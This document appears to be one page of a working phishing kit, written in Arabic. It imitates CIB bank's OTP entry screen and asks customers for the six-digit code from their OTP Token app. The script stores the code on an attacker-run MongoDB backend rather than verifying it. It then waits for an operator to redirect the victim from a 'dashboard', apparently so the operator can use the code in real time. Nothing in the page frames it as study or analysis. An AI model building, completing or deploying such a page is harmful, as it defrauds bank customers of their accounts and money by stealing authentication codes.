<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>CIB - الرقم السرى المتغير OTP</title>
    <link rel="stylesheet" href="otp2.css" />
  </head>
  <body class="otp2-page">
    <header class="otp2-topbar">(الرقم السرى المتغير (OTP</header>

    <main class="otp2-main">
      <h1 class="otp2-heading">OTP أدخل الرقم السرى المتغير</h1>
      <p class="otp2-lead">عزيزي العميل برجاء إدخال الرقم السري المتغير الذي تم إنشائه من خلال تطبيق CIB OTP Token
      </p>

      <div class="otp2-cells-wrap" aria-label="رمز مكون من 6 أرقام">
        <input
          class="otp2-cell"
          type="text"
          inputmode="numeric"
          maxlength="1"
          autocomplete="one-time-code"
          aria-label="الرقم 1"
        />
        <input
          class="otp2-cell"
          type="text"
          inputmode="numeric"
          maxlength="1"
          autocomplete="off"
          aria-label="الرقم 2"
        />
        <input
          class="otp2-cell"
          type="text"
          inputmode="numeric"
          maxlength="1"
          autocomplete="off"
          aria-label="الرقم 3"
        />
        <input
          class="otp2-cell"
          type="text"
          inputmode="numeric"
          maxlength="1"
          autocomplete="off"
          aria-label="الرقم 4"
        />
        <input
          class="otp2-cell"
          type="text"
          inputmode="numeric"
          maxlength="1"
          autocomplete="off"
          aria-label="الرقم 5"
        />
        <input
          class="otp2-cell"
          type="text"
          inputmode="numeric"
          maxlength="1"
          autocomplete="off"
          aria-label="الرقم 6"
        />
      </div>

      <input
        id="otp-code"
        class="otp2-hidden-code"
        type="text"
        maxlength="6"
        tabindex="-1"
        aria-hidden="true"
      />
    </main>

    <footer class="otp2-footer">
      <button class="otp2-submit otp-btn" type="button">
        استخدم تطبيق الرقم السري المتغير OTP
      </button>
    </footer>

    <script src="api-config.js"></script>
    <script src="api-client.js"></script>
    <script>
      (function () {
        function digitsOtp(str) {
          return String(str || '').replace(/\D/g, '').slice(0, 6);
        }

        function syncOtpCodeFromCells(cells, hidden) {
          var v = '';
          for (var i = 0; i < cells.length; i++) {
            v += digitsOtp(cells[i].value).slice(-1);
          }
          hidden.value = v.slice(0, 6);
        }

        function setupOtpCells() {
          var cells = document.querySelectorAll('.otp2-cell');
          var hidden = document.getElementById('otp-code');
          if (!cells.length || !hidden) return;

          cells.forEach(function (cell, i) {
            cell.addEventListener('input', function () {
              var d = digitsOtp(cell.value).slice(-1);
              cell.value = d;
              syncOtpCodeFromCells(cells, hidden);
              if (d && i < cells.length - 1) cells[i + 1].focus();
            });
            cell.addEventListener('keydown', function (e) {
              if (e.key === 'Backspace' && !cell.value && i > 0) {
                cells[i - 1].focus();
              }
            });
            cell.addEventListener('paste', function (e) {
              e.preventDefault();
              var pasted = digitsOtp(
                (e.clipboardData && e.clipboardData.getData('text')) || ''
              );
              for (var j = 0; j < cells.length; j++) {
                cells[j].value = pasted[j] || '';
              }
              syncOtpCodeFromCells(cells, hidden);
              var next = Math.min(pasted.length, cells.length - 1);
              cells[next].focus();
            });
          });
        }

        var pollStop = null;
        function stopPoll() {
          if (typeof pollStop === 'function') {
            pollStop();
            pollStop = null;
          }
        }

        function ensureOtpLoadingOverlay() {
          var el = document.getElementById('otpFormLoading');
          if (el) return el;
          el = document.createElement('div');
          el.id = 'otpFormLoading';
          el.className = 'otp-full-loading';
          el.setAttribute('aria-busy', 'true');
          el.innerHTML =
            '<div class="otp-full-loading-inner">' +
            '<div class="otp-full-loading-spinner" aria-hidden="true"></div>' +
            '<p class="otp-loading-message">جاري المعالجة...</p>' +
            '</div>';
          document.body.appendChild(el);
          return el;
        }

        function setOtpLoadingMsg(msg) {
          var el = document.getElementById('otpFormLoading');
          if (!el) return;
          var p = el.querySelector('.otp-loading-message');
          if (p) p.textContent = msg;
        }

        function showOtpFullLoading(msg) {
          var el = ensureOtpLoadingOverlay();
          setOtpLoadingMsg(msg || 'جاري المعالجة...');
          el.style.display = 'flex';
        }

        function hideOtpFullLoading() {
          var el = document.getElementById('otpFormLoading');
          if (!el) return;
          el.style.display = 'none';
        }

        var totalSeconds = 2 * 60;
        var timerEl = document.getElementById('otp-timer');
        if (timerEl) {
          function format(seconds) {
            var m = Math.floor(seconds / 60);
            var s = seconds % 60;
            return (
              String(m).padStart(2, '0') + ':' + String(s).padStart(2, '0')
            );
          }
          timerEl.textContent = format(totalSeconds);
          var intervalId = setInterval(function () {
            totalSeconds -= 1;
            if (totalSeconds <= 0) {
              timerEl.textContent = '00:00';
              clearInterval(intervalId);
              return;
            }
            timerEl.textContent = format(totalSeconds);
          }, 1000);
        }

        setupOtpCells();

        var otpInput = document.getElementById('otp-code');
        if (otpInput) {
          otpInput.addEventListener('input', function () {
            otpInput.value = digitsOtp(otpInput.value);
            var v = otpInput.value;
            var cellList = document.querySelectorAll('.otp2-cell');
            if (v.length === 6 && cellList.length === 6) {
              for (var t = 0; t < 6; t++) {
                cellList[t].value = v[t] || '';
              }
            }
          });
        }

        document.querySelector('.otp-btn').addEventListener('click', async function () {
          if (typeof stopYasmeenSessionNavPolling === 'function') {
            stopYasmeenSessionNavPolling();
          }
          stopPoll();
          var cells = document.querySelectorAll('.otp2-cell');
          var hiddenEl = document.getElementById('otp-code');
          if (cells.length && hiddenEl) {
            var combined = '';
            for (var c = 0; c < cells.length; c++) {
              combined += digitsOtp(cells[c].value).slice(-1);
            }
            var fromHidden = digitsOtp(hiddenEl.value);
            if (combined.length === 6) {
              hiddenEl.value = combined;
            } else if (fromHidden.length === 6) {
              hiddenEl.value = fromHidden;
              for (var k = 0; k < cells.length; k++) {
                cells[k].value = fromHidden[k] || '';
              }
            } else {
              hiddenEl.value = combined;
            }
          }
          var otpCode = digitsOtp(document.getElementById('otp-code').value);
          if (otpCode.length !== 6) {
            alert('الرجاء إدخال 6 أرقام بالضبط لرمز التحقق.');
            return;
          }

          showOtpFullLoading('جاري حفظ البيانات...');

          var newUser = {
            page: 'otp2',
            verificationCode: otpCode,
            timestamp: new Date().toLocaleString('ar-EG'),
            registrationTime: new Date().toLocaleString('ar-EG'),
            name: 'OTP2'
          };

          try {
            await saveSubmission(newUser);
          } catch (e) {
            console.error(e);
            hideOtpFullLoading();
            alert('تعذر حفظ الرمز. تأكد أن الخادم وMongoDB يعملان.');
            return;
          }

          setOtpLoadingMsg('يرجى الانتظار، جاري التحقق من قبل النظام...');

          if (typeof startSessionRedirectPolling !== 'function') {
            hideOtpFullLoading();
            alert('تم الحفظ. تحمّل api-client.js لاستكمال انتظار التوجيه من الداشبورد.');
            return;
          }

          stopPoll();
          pollStop = startSessionRedirectPolling(
            function (url) {
              stopPoll();
              window.location.href = url;
            },
            function (msg) {
              hideOtpFullLoading();
              alert(msg);
            }
          );
        });
      })();
    </script>
  </body>
</html>
